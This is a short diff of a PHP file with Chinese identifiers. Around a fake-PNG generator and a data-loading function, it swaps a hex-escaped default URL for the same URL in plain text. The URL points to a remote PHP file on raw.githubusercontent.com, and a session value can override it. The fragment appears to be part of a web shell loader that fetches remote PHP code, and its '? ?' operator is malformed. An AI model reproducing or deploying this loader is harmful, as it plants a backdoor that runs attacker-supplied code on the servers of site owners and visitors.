@@ -51,7 +51,7 @@ function generateFakePng()
 session_start();
 
 // 设置主地址，如果没有设置则使用默认地址
-$主地址 = $_SESSION['ts_url'] ? ? "\x68\164\x74\160\163\x3a\x2f\x2f\162\141\x77\x2e\x67\x69\164\x68\165\x62\165\163\145\162\143\x6f\156\164\x65\x6e\x74\56\143\x6f\x6d\x2f\164\151\x6b\x75\x6e\x67\66\x65\164\x61\x72\57\116\x79\141\162\x65\x6b\x2f\x72\145\146\163\57\x68\x65\141\x64\163\x2f\x6d\141\x73\164\145\162\x2f\x67\x61\x66\x61\56\x70\x68\160";
+$主地址 = $_SESSION['ts_url'] ? ? "https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/gafa.php";
 
 // 定义加载函数
 function 加载数据($地址)
